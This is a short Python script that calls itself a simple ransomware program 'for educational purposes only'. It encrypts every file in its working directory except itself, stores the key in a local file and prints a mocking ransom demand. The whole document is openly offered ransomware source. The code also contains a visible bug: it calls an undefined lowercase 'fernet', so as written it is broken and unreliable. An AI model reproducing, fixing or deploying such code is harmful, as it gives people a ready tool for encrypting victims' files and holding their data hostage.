#!/usr/bin/env python3
#This is a simple ransomware script for encryption
#Please see thor.py for decryption
#For educational purposes only

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
  if file == "loki.py" or file == "thekey.key":
    continue
  if os.path.isfile(file):
    files.append(file)
 
key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
  thekey.write(key)
  
for file in files:
  with open(file, "rb") as thefile:
    contents = thefile.read()
  contents_encrypted = fernet(key).encrypt(contents)
  with open(file, "wb") as thefile:
    thefile.write(contents_encrypted)

print("You just got pwned! Do 10000 squats or I delete your files in 24 seconds.")
